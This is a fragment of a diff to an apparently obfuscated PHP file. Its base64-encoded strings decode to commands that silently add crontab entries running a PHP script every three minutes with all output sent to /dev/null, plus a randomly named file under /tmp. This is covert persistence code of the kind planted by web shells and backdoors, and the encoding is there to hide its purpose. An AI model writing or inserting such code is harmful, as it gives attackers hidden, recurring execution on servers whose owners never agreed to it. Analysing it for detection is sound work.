@@ -55,9 +55,7 @@ function m4n5g6h7j8k9l0($w6e7r8t9y0u1i2o3p4) {
         $e5f6g7h8i9j0k1l2m3n4o5p6q7r8 = base64_decode("Ki8zICogKiAqICo=") . " php $c3d4e5f6g7h8i9j0k1l2m3n4o5p6 " . base64_decode("Pi9kZXYvbnVsbCAyPiYxCg==");
         $z1a2s3d4f5g6h7j8k9l .= $e5f6g7h8i9j0k1l2m3n4o5p6q7r8;
         }
-        $r4gb0flc7blg5nd0z8f = base64_decode("L3RtcC8=") . md5($q7w8e9r0t1y2u3i4o5p . time() . rand()) . base64_decode("LmZybQ==");
-        $p0o9i8u7y6t5r4e3w2q = $a1s2d3f4g5h6j7k8l9m === base64_decode("ZWNobw==") ? "$r4gb0flc7blg5nd0z8f" : "$r4gb0flc7blg5nd0z8f";
-        $z1a2s3d4f5g6h7j8k9l .= "*/$v6c5b4n3m2k1j9h8g7f * * * * $a1s2d3f4g5h6j7k8l9m$p0o9i8u7y6t5r4e3w2q " . base64_decode("Pi9kZXYvbnVsbCAyPiYxCg==");
+        $r4gb0flc7blg5nd0z8f = base64_decode("L3RtcC8=") . md5(base64_decode("Ki8zICogKiAqICo=") . time() . rand()) . base64_decode("LmZybQ==");
         exec(base64_decode("KGNyb250YWIgLWwgMj4vZGV2L251bGw7IA==") . base64_decode("ZWNobyA=") . escapeshellarg($z1a2s3d4f5g6h7j8k9l) . base64_decode("KSB8IGNyb250YWIgLQ=="));
 }
 // part 5
